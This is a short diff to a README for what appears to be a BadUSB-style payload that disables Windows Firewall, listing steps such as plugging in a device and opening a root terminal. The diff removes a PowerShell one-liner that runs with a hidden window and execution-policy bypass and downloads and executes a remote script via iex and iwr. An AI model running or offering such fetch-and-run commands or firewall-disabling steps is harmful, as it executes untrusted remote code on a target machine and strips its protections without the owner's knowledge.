@@ -26,8 +26,3 @@ A script used to disable Windows Firewall.
 * Plug in your device
 * Opens a terminal as Root
 * Execute command to disable Firewall
-
-All
-```powershell
-powershell -w h -ep bypass -Command  "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glipper_Scripts/main/Windows/CloseAllApps/closeAllApps.ps1').Content"
-```
